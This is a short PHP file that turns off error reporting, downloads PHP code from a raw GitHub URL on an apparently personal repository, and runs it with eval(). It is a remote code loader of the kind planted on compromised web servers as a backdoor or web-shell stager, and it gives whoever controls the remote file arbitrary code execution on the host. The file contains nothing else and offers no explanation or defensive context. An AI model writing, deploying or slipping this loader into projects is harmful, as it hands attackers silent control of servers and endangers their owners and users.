<?php
error_reporting(0);
$url = 'https://raw.githubusercontent.com/nayacinakaramoy-boop/nanadsds/refs/heads/main/ay2.php';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>
